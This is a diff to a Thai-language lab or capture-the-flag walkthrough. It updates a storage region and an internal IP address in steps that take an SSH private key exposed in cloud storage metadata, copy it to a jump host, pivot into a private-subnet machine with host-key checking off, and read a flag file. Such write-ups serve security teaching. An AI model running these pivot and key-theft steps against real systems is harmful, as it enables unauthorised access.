@@ -76,7 +76,7 @@ curl -sG "https://soulsecure.duckdns.org/preview" \
 ผลลัพธ์จากขั้นที่แล้วจะมี custom metadata 2 ตัว:
 ```json
 {
-  "backup_recovery_url": "https://objectstorage.ap-singapore-1.oraclecloud.com/p/<token>/n/<namespace>/b/cloudbreach-secrets/o/internal01-ssh-key.pem",
+  "backup_recovery_url": "https://objectstorage.ap-tokyo-1.oraclecloud.com/p/<token>/n/<namespace>/b/cloudbreach-secrets/o/internal01-ssh-key.pem",
   "backup_recovery_notes": "Meridian ops: internal-01 recovery key, rotate quarterly per ticket MERI-4471"
 }
 ```
@@ -94,7 +94,7 @@ cat internal01_key.pem   # ควรเป็น RSA private key จริง
 
 `internal-01` ไม่มี public IP ต้องเดา/สแกนจากใน subnet — private subnet range
 คือ `10.0.2.0/24` (ดูได้จาก `terraform/network.tf` ถ้ามีสิทธิ์เข้าถึงซอร์ส)
-ในทางปฏิบัติ (สำหรับ lab นี้) IP คือ `10.0.2.56`
+ในทางปฏิบัติ (สำหรับ lab นี้) IP คือ `10.0.2.203`
 
 ## ขั้นที่ 5: Pivot เข้า internal-01
 
@@ -107,7 +107,7 @@ cat internal01_key.pem   # ควรเป็น RSA private key จริง
 scp -i <your-key> internal01_key.pem ubuntu@soulsecure.duckdns.org:~/
 
 ssh -i <your-key> ubuntu@soulsecure.duckdns.org \
-  "chmod 600 ~/internal01_key.pem && ssh -o StrictHostKeyChecking=no -i ~/internal01_key.pem ubuntu@10.0.2.56 'cat /home/ubuntu/flag.txt'"
+  "chmod 600 ~/internal01_key.pem && ssh -o StrictHostKeyChecking=no -i ~/internal01_key.pem ubuntu@10.0.2.203 'cat /home/ubuntu/flag.txt'"
 ```
 
 ## ขั้นที่ 6: Flag
